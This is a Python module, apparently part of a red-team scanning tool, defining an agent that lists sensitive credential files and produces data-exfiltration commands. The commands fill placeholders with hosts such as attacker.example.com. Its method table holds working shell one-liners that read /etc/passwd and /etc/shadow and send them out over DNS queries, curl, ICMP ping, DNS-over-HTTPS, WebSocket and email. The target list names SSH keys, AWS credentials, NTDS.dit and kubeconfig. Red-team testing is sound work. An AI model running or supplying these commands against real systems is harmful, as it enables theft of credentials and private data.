from __future__ import annotations

import logging

from bugfinder.agents.base import AgentContext, AgentResult, BaseAgent
from bugfinder.core.types import Confidence, Severity

logger = logging.getLogger(__name__)

EXFILTRATION_METHODS = [
    {
        "id": "dns_exfil",
        "title": "DNS Tunneling Exfiltration",
        "description": "Encodes data as DNS queries to exfiltrate through DNS resolution requests",
        "protocol": "dns",
        "detection": "Monitor for unusually long DNS queries or high volumes of NXDOMAIN responses",
        "commands": [
            'cat /etc/passwd | while read line; do echo "$line" | xxd -p | tr -d "\\n"; done | while read hex; do dig @{{C2_DNS}} "$hex.{{DOMAIN}}" +short; done',
        ],
        "tools": ["dnscat2", "iodine", "dnscat"],
    },
    {
        "id": "http_exfil",
        "title": "HTTP/HTTPS Exfiltration",
        "description": "Encodes data in HTTP request headers, cookies, or body to blend with normal traffic",
        "protocol": "http",
        "detection": "Monitor for unusual request sizes or patterns in web server logs",
        "commands": [
            'curl -s -H "X-Data: $(cat /etc/passwd | base64 -w0)" https://{{C2_HOST}}/exfil',
            'curl -s -d "$(cat /etc/shadow | base64 -w0)" https://{{C2_HOST}}/upload',
        ],
        "tools": ["curl", "wget", "powershell Invoke-WebRequest"],
    },
    {
        "id": "icmp_exfil",
        "title": "ICMP Covert Channel",
        "description": "Encodes data in ICMP echo request packets to bypass firewalls",
        "protocol": "icmp",
        "detection": "Monitor for unusual ICMP packet sizes or frequencies",
        "commands": [
            'cat data.txt | while read line; do ping -c 1 -p $(echo -n "$line" | xxd -p) {{C2_HOST}}; done',
        ],
        "tools": ["ping", "nping", "hping3"],
    },
    {
        "id": "dns_http_mixed",
        "title": "DNS-over-HTTPS Exfiltration",
        "description": "Exfiltrates data using DNS-over-HTTPS (DoH) for encrypted exfiltration",
        "protocol": "https",
        "detection": "Monitor for connections to known DoH providers from internal hosts",
        "commands": [
            'cat /etc/passwd | base64 -w0 | while read d; do curl -s -H "Content-Type: application/dns-message" -d "$(printf "\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00"$(echo -n "$d.$(echo -n $d | wc -c).exfil.{{DOMAIN}}" | xxd -p))" https://dns.google/dns-query; done',
        ],
        "tools": ["cloudflared", "dnscrypt-proxy"],
    },
    {
        "id": "websocket_exfil",
        "title": "WebSocket Tunneling",
        "description": "Uses WebSocket connections to tunnel exfiltrated data through firewalls",
        "protocol": "ws",
        "detection": "Monitor for long-lived WebSocket connections to unusual endpoints",
        "commands": [
            "python3 -c \"\nimport asyncio,websockets,base64\nasync def exfil():\n    async with websockets.connect('wss://{{C2_HOST}}/ws') as ws:\n        with open('/etc/passwd') as f:\n            await ws.send(base64.b64encode(f.read().encode()))\n        result = await ws.recv()\n        print(result)\nasyncio.run(exfil())\n\"",
        ],
        "tools": ["websocat", "wscat"],
    },
    {
        "id": "smtp_exfil",
        "title": "SMTP/Email Exfiltration",
        "description": "Exfiltrates data by sending it as email attachments or body",
        "protocol": "smtp",
        "detection": "Monitor for large email attachments or unusual sender/recipient patterns",
        "commands": [
            'cat /etc/passwd | mail -s "EXFIL: $(hostname)" {{SMTP_RCPT}}',
            'echo "$(base64 /etc/passwd)" | sendmail {{SMTP_RCPT}}',
        ],
        "tools": ["mail", "sendmail", "mutt"],
    },
]

EXFIL_CHUNK_SIZES = [512, 1024, 4096, 8192, 16384]


class DataExfilAgent(BaseAgent):
    name = "redteam.data_exfil"
    description = "Identifies data exfiltration paths and generates exfiltration payloads"
    category = "redteam"

    def __init__(self, context: AgentContext) -> None:
        super().__init__(context)

    async def execute(self) -> AgentResult:
        findings = []

        target = self.context.target
        c2_host = self.context.config.get("exfil_c2_host", "attacker.example.com")
        c2_dns = self.context.config.get("exfil_dns_server", "ns1.attacker.example.com")
        smtp_rcpt = self.context.config.get("exfil_smtp_rcpt", "exfil@example.com")
        domain = self.context.config.get("exfil_domain", "exfil.example.com")

        # Check for sensitive file patterns in scope
        sensitive_paths = self.context.config.get(
            "sensitive_files",
            [
                "/etc/passwd",
                "/etc/shadow",
                "/etc/ssh/sshd_config",
                "~/.ssh/id_rsa",
                "~/.aws/credentials",
                "/etc/kubernetes/admin.conf",
                "C:\\Windows\\NTDS\\NTDS.dit",
                "/var/lib/mysql/mysql/user.MYD",
                "/proc/sched_debug",
                "/proc/kcore",
                "/sys/kernel/security/",
            ],
        )

        finding = {
            "id": "exfil-sensitive-files",
            "title": "Sensitive File Discovery for Exfiltration",
            "description": f"Identified {len(sensitive_paths)} sensitive file paths that could be exfiltrated",
            "severity": Severity.CRITICAL.value,
            "confidence": Confidence.VERIFIED.value,
            "category": "redteam.data_exfiltration",
            "evidence": "Target files:\n" + "\n".join(f"  - {p}" for p in sensitive_paths),
            "remediation": "Restrict file system permissions and implement DLP controls",
            "sensitive_paths": sensitive_paths,
        }
        findings.append(finding)

        for method in EXFILTRATION_METHODS:
            commands = []
            for cmd in method["commands"]:
                rendered = (
                    cmd.replace("{{C2_HOST}}", c2_host)
                    .replace("{{C2_DNS}}", c2_dns)
                    .replace("{{DOMAIN}}", domain)
                    .replace("{{SMTP_RCPT}}", smtp_rcpt)
                )
                commands.append(rendered)

            finding = {
                "id": f"exfil-{method['id']}",
                "title": method["title"],
                "description": method["description"],
                "severity": Severity.CRITICAL.value,
                "confidence": Confidence.LIKELY.value,
                "category": "redteam.data_exfiltration",
                "evidence": f"Protocol: {method['protocol']}\nDetection: {method['detection']}",
                "remediation": method["detection"],
                "protocol": method["protocol"],
                "commands": commands,
                "tools": method.get("tools", []),
                "chunk_sizes": EXFIL_CHUNK_SIZES,
            }
            findings.append(finding)

        return AgentResult(
            agent_name=self.name,
            status="completed",
            findings=findings,
            summary=f"Mapped {len(EXFILTRATION_METHODS)} exfiltration channels for {target}",
            data={
                "methods": len(EXFILTRATION_METHODS),
                "sensitive_files": len(sensitive_paths),
                "protocols": list(set(m["protocol"] for m in EXFILTRATION_METHODS)),
            },
        )
